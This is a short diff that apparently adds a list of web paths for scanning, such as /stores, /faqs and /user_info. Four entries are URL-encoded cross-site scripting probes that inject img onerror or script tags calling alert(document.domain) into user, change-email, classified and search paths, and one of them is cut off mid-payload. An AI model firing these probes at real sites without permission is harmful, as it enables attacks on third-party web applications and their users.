@@ -1,0 +1,9 @@
+/classified/%22%3E%3Cimg%20src=a%20onerror=alert(
+/search/index?q=
+/stores
+/user_info
+/faqs
+/classifieds
+/users/test%22%3E%3Cimg%20src=a%20onerror=alert(document.domain)%3Etest
+/users/change_emailahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3eahrixia?step1=1
+/search/index/?q=test%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3etest
